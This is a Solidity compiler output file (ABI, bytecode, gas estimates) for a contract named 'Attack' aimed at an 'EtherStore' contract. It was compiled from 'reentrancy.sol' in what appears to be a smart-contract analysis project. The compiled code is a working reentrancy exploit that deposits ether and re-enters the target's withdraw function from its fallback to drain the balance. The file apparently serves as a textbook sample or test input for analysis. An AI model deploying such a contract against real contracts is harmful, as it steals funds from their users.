{
    "contractName": "Attack",
    "abi": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_etherStoreAddress",
                    "type": "address"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "stateMutability": "payable",
            "type": "fallback"
        },
        {
            "inputs": [],
            "name": "attack",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "etherStore",
            "outputs": [
                {
                    "internalType": "contract EtherStore",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "getBalance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ],
    "bytecode": "608060405234801561001057600080fd5b506040516102b63803806102b683398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b610223806100936000396000f3fe6080604052600436106100345760003560e01c806312065fe0146100ad5780639e5faafc146100cd578063acd2e6e5146100d5575b600054670de0b6b3a76400006001600160a01b0390911631106100ab576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009257600080fd5b505af11580156100a6573d6000803e3d6000fd5b505050505b005b3480156100b957600080fd5b506040514781526020015b60405180910390f35b6100ab61010d565b3480156100e157600080fd5b506000546100f5906001600160a01b031681565b6040516001600160a01b0390911681526020016100c4565b670de0b6b3a764000034101561012257600080fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561017857600080fd5b505af115801561018c573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156101d357600080fd5b505af11580156101e7573d6000803e3d6000fd5b5050505056fea26469706673582212206cca4ff8cafe9536f42d96dca5ccc89efaf153a847f03a5a2eda02b52cc36eb364736f6c634300080b0033",
    "sourcePath": "c:/Users/maria/Documents/GitHub/sol-analyze/sol-analyze/reentrancy.sol",
    "compiler": {
        "name": "solc",
        "version": "0.8.11+commit.d7f03943"
    },
    "functionHashes": {
        "attack()": "9e5faafc",
        "etherStore()": "acd2e6e5",
        "getBalance()": "12065fe0"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "109400",
            "executionCost": "infinite",
            "totalCost": "infinite"
        },
        "external": {
            "": "infinite",
            "attack()": "infinite",
            "etherStore()": "2359",
            "getBalance()": "146"
        }
    }
}